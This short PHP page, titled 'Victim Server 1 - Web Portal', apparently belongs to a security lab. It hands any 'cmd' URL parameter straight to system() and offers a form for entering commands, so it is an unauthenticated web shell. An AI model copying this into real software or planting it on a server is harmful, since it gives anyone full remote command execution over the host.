<?php
echo "<h1>Victim Server 1 - Web Portal</h1>";
echo "<p>Server Status: Online</p>";
echo "<p>System: " . php_uname() . "</p>";
if (isset($_GET["cmd"])) {
    echo "<pre>";
    system($_GET["cmd"]);
    echo "</pre>";
}
?>
<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
